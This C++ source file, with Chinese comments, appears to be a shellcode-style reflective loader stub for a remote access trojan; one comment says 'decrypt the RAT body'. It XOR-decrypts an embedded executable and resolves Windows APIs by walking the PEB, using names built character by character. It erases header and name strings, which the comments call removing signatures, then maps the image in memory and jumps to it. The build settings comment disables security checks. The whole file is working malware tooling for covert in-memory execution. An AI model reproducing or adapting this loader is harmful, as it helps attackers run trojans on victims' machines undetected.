#include <iostream>
#include <windows.h>

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release x64
* 2.C/C++
* 常规: SDL检查(否)
* 优化: 优化(已禁用)
* 代码生成: 启用 C++ 异常(否); 运行库(多线程); 安全检查(禁用安全检查)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
*/

using namespace std;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID(WINAPI* pHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef HANDLE(WINAPI* pGetProcessHeap)();

size_t StrLen(char* str);
int IsEqual(char* str1, char* str2);
void* MemSet(void* dest, int c, size_t count);
void* MemCopy(void* dest, const void* src, size_t count);
void XorData(PBYTE src, PBYTE dest, size_t len, PBYTE pKey);
PBYTE GetDllBase(char* dllName, pLoadLibraryA funcLoadLibraryA);
PBYTE FindExpFuncAddr(PBYTE pImageBase, char* funcName, WORD ordinal, pGetProcAddress funcGetProcAddress);
void RefLoader(PBYTE pBin, size_t binSize, PBYTE pKey);

#pragma code_seg(".shell")

// 内置
__declspec(dllexport) void Header() {
    // mov rax, 0x1234567812345678 -> mov rax, key
    // 48 B8 78 56 34 12 78 56 34 12 -> 48 B8 key
    size_t key = 0x1234567812345678;
    PBYTE pKey = (PBYTE)&key;
    // mov rax, 0x1234567812345678 -> mov rax, binSize
    // 48 B8 78 56 34 12 78 56 34 12 -> 48 B8 binSize
    size_t binSize = 0x1234567812345678;
    // mov rax, 0x1234567812345678 -> lea rax, [rip]
    // 48 B8 78 56 34 12 78 56 34 12 -> 48 8D 05 00 00 00 00 90 90 90
    PBYTE pBin = (PBYTE)0x1234567812345678;
    while ((char)(pBin[0] ^ pKey[0]) != 'M' || (char)(pBin[1] ^ pKey[1]) != 'Z' || (char)(pBin[2] ^ pKey[2]) != 'x') { // char 有符号, BYTE 无符号, 不能直接比较
        pBin++;
    }
    RefLoader(pBin, binSize, pKey);
}

void RefLoader(PBYTE pBin, size_t binSize, PBYTE pKey) {
    volatile char KERNEL32_STR[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0' };
    PBYTE pKernel32 = GetDllBase((char*)KERNEL32_STR, NULL);
    if (pKernel32 == NULL) {
        volatile char kernel32_STR[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
        pKernel32 = GetDllBase((char*)kernel32_STR, NULL);
    }
    if (pKernel32 == NULL) {
        return;
    }
    volatile char LoadLibraryA_STR[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
    volatile char GetProcAddress_STR[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
    volatile char VirtualAlloc_STR[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
    volatile char VirtualProtect_STR[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
    volatile char GetProcessHeap_STR[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p', '\0' };
    volatile char HeapAlloc_STR[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c', '\0' };
    pGetProcAddress funcGetProcAddress = (pGetProcAddress)FindExpFuncAddr(pKernel32, (char*)GetProcAddress_STR, -1, NULL);
    pLoadLibraryA funcLoadLibraryA = (pLoadLibraryA)FindExpFuncAddr(pKernel32, (char*)LoadLibraryA_STR, -1, funcGetProcAddress);
    pVirtualAlloc funcVirtualAlloc = (pVirtualAlloc)FindExpFuncAddr(pKernel32, (char*)VirtualAlloc_STR, -1, funcGetProcAddress);
    pVirtualProtect funcVirtualProtect = (pVirtualProtect)FindExpFuncAddr(pKernel32, (char*)VirtualProtect_STR, -1, funcGetProcAddress);
    pGetProcessHeap funcGetProcessHeap = (pGetProcessHeap)FindExpFuncAddr(pKernel32, (char*)GetProcessHeap_STR, -1, funcGetProcAddress);
    pHeapAlloc funcHeapAlloc = (pHeapAlloc)FindExpFuncAddr(pKernel32, (char*)HeapAlloc_STR, -1, funcGetProcAddress);
    if (funcLoadLibraryA == NULL || funcGetProcAddress == NULL || funcVirtualAlloc == NULL || funcVirtualProtect == NULL || funcHeapAlloc == NULL || funcGetProcessHeap == NULL) {
        return;
    }

    // 解密 RAT 本体
    HANDLE hHeap = funcGetProcessHeap();
    if (hHeap == NULL) {
        return;
    }
    PBYTE pBuf = (PBYTE)funcHeapAlloc(hHeap, HEAP_ZERO_MEMORY, binSize);
    if (pBuf == NULL) {
        return;
    }
    XorData(pBin, pBuf, binSize, pKey);

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBuf;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBuf + pDos->e_lfanew);
    WORD numberOfSections = pNt->FileHeader.NumberOfSections;
    DWORD_PTR imageBase = pNt->OptionalHeader.ImageBase;
    DWORD sizeOfImage = pNt->OptionalHeader.SizeOfImage;
    DWORD importDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]))->VirtualAddress;
    DWORD relocDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]))->VirtualAddress;
    MemSet(pDos, 0, pDos->e_lfanew); // 去除 DOS 特征

    PVOID pText = NULL;
    size_t textSize = 0;
    PBYTE pImageBase = (PBYTE)funcVirtualAlloc(NULL, sizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    if (pImageBase == NULL) {
        return;
    }
    volatile char _text_STR[] = { '.', 't', 'e', 'x', 't', '\0' };
    PIMAGE_SECTION_HEADER pSectionTable = (PIMAGE_SECTION_HEADER)((DWORD_PTR) & (pNt->OptionalHeader) + pNt->FileHeader.SizeOfOptionalHeader);
    for (size_t i = 0; i < numberOfSections; i++) {
        if (IsEqual((char*)pSectionTable[i].Name, (char*)_text_STR)) {
            pText = pImageBase + pSectionTable[i].VirtualAddress;
            textSize = pSectionTable[i].SizeOfRawData;
        }
        MemCopy(pImageBase + pSectionTable[i].VirtualAddress, pBuf + pSectionTable[i].PointerToRawData, pSectionTable[i].SizeOfRawData);
    }
    if (pText == NULL) {
        return;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImportDir = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBase + importDirRVA);
    while (pImportDir->FirstThunk) {
        PBYTE pDll = GetDllBase((char*)pImageBase + pImportDir->Name, funcLoadLibraryA);
        if (pDll == NULL) {
            return;
        }
        PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pImageBase + pImportDir->FirstThunk);
        while (pIAT->u1.AddressOfData) {
            PBYTE pFunc = NULL;
            if (IMAGE_SNAP_BY_ORDINAL(pIAT->u1.Ordinal)) {
                pFunc = FindExpFuncAddr(pDll, NULL, IMAGE_ORDINAL(pIAT->u1.Ordinal), funcGetProcAddress);
            }
            else {
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImageBase + pIAT->u1.AddressOfData);
                pFunc = FindExpFuncAddr(pDll, pImportByName->Name, -1, funcGetProcAddress);
            }
            if (pFunc == NULL) {
                return;
            }
            *(PDWORD_PTR)pIAT = (DWORD_PTR)pFunc;
            pIAT++;
        }
        pImportDir++;
    }

    PIMAGE_BASE_RELOCATION pRelocDir = (PIMAGE_BASE_RELOCATION)(pImageBase + relocDirRVA);
    while (pRelocDir->SizeOfBlock) {
        PWORD pTypeOffset = (PWORD)((DWORD_PTR)pRelocDir + sizeof(IMAGE_BASE_RELOCATION));
        size_t typeOffsetNum = (pRelocDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        while (typeOffsetNum--) {
            if (pTypeOffset[typeOffsetNum] >> 12 == IMAGE_REL_BASED_DIR64) {
                *(PDWORD_PTR)(pImageBase + pRelocDir->VirtualAddress + (pTypeOffset[typeOffsetNum] & 0xFFF)) += (DWORD_PTR)pImageBase - imageBase;
            }
        }
        pRelocDir = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocDir + pRelocDir->SizeOfBlock);
    }

    DWORD oldProtect;
    if (!funcVirtualProtect(pText, textSize, PAGE_EXECUTE_READ, &oldProtect)) {
        return;
    }
    ((void(*)(...))(pImageBase + pNt->OptionalHeader.AddressOfEntryPoint))();
}

size_t StrLen(char* str) {
    size_t len = 0;
    if (str != NULL) {
        while (str[len] != '\0') len++;
    }
    return len;
}

int IsEqual(char* str1, char* str2) {
    if (str1 != NULL && str2 != NULL) {
        while (*str1 != '\0' && *str1 == *str2) {
            str1++;
            str2++;
        }
        return *str1 == *str2;
    }
    if (str1 == str2) {
        return 1;
    }
    return 0;
}

void* MemSet(void* dest, int c, size_t count) {
    if (dest != NULL) {
        for (size_t i = 0; i < count; i++) {
            ((PBYTE)dest)[i] = c;
        }
    }
    return dest;
}

void* MemCopy(void* dest, const void* src, size_t count) {
    if (src != NULL && dest != NULL) {
        for (size_t i = 0; i < count; i++) {
            ((PBYTE)dest)[i] = ((PBYTE)src)[i];
        }
    }
    return dest;
}

void XorData(PBYTE src, PBYTE dest, size_t len, PBYTE pKey) {
    size_t keyIndex = 0;
    for (size_t i = 0; i < len; i++) {
        dest[i] = src[i] ^ pKey[keyIndex];
        keyIndex++;
        if (keyIndex == 8) {
            keyIndex = 0;
        }
    }
}

PBYTE GetDllBase(char* dllName, pLoadLibraryA funcLoadLibraryA) {
    size_t dllNameLen = StrLen(dllName);
    if (dllNameLen > 4) {
        dllName[dllNameLen - 4] = '\0';
    }
    PBYTE pDll = NULL;
    DWORD_PTR _PEB = __readgsqword(0x60);
    DWORD_PTR _PEB_LDR_DATA = *(PDWORD_PTR)(_PEB + 0x18);
    PLIST_ENTRY pInInitializationOrderModuleList = (PLIST_ENTRY) * (PDWORD_PTR)(_PEB_LDR_DATA + 0x30);
    PLIST_ENTRY pNode = pInInitializationOrderModuleList;
    do {
        char curDllName[20];
        PUNICODE_STRING wString = (PUNICODE_STRING)((PBYTE)pNode + 0x38);
        size_t curDllNameLen = wString->Length / sizeof(wchar_t) - 4;
        if (curDllNameLen < sizeof(curDllName)) {
            for (size_t i = 0; i < curDllNameLen; i++) {
                curDllName[i] = wString->Buffer[i];
            }
            curDllName[curDllNameLen] = '\0';
            if (IsEqual(curDllName, dllName)) {
                pDll = (PBYTE) * (PDWORD_PTR)((PBYTE)pNode + 0x10);
                break;
            }
        }
        pNode = pNode->Flink;
    } while (pNode->Flink != pInInitializationOrderModuleList);
    if (pDll == NULL && funcLoadLibraryA != NULL) {
        pDll = (PBYTE)funcLoadLibraryA(dllName);
    }
    MemSet(dllName, 0, dllNameLen); // 去除特征字符串
    return pDll;
}

PBYTE FindExpFuncAddr(PBYTE pImageBase, char* funcName, WORD ordinal, pGetProcAddress funcGetProcAddress) {
    PBYTE pFunc = NULL;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pImageBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDataDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pImageBase + exportDataDir.VirtualAddress);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    DWORD numberOfFunctions = pExportDir->NumberOfFunctions;
    PDWORD pAddressOfFunctions = (PDWORD)(pImageBase + pExportDir->AddressOfFunctions);
    PDWORD pAddressOfNames = (PDWORD)(pImageBase + pExportDir->AddressOfNames);
    PWORD pAddressOfNameOrdinals = (PWORD)(pImageBase + pExportDir->AddressOfNameOrdinals);
    if (funcName == NULL) {
        DWORD index = ordinal - pExportDir->Base;
        if (index >= 0 && index < numberOfFunctions) {
            pFunc = pImageBase + pAddressOfFunctions[index];
        }
    }
    else {
        for (size_t i = 0; i < numberOfNames; i++) {
            char* curFuncName = (char*)pImageBase + pAddressOfNames[i];
            if (IsEqual(curFuncName, funcName)) {
                pFunc = pImageBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]];
                break;
            }
        }
    }
    if (pFunc != NULL && pFunc >= (PBYTE)pExportDir && pFunc < (PBYTE)pExportDir + exportDataDir.Size) {
        pFunc = NULL; // 重定向
    }
    if (pFunc == NULL && funcGetProcAddress != NULL) {
        if (funcName != NULL) {
            pFunc = (PBYTE)funcGetProcAddress((HMODULE)pImageBase, funcName);
        }
        else {
            pFunc = (PBYTE)funcGetProcAddress((HMODULE)pImageBase, (char*)ordinal);
        }
    }
    if (funcName != NULL) {
        MemSet(funcName, 0, StrLen(funcName)); // 去除特征字符串
    }
    return pFunc;
}

#pragma code_seg(".text")

int main() {
    HANDLE hFile = CreateFileA("Separation.bin", GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
    DWORD binSize = GetFileSize(hFile, NULL);
    PBYTE pBin = (PBYTE)malloc(binSize);
    DWORD readFileSize;
    ReadFile(hFile, pBin, binSize, &readFileSize, NULL);
    cout << hex << binSize << endl;
    size_t key = 0x1234567812345678;
    RefLoader(pBin, binSize, (PBYTE)&key);
}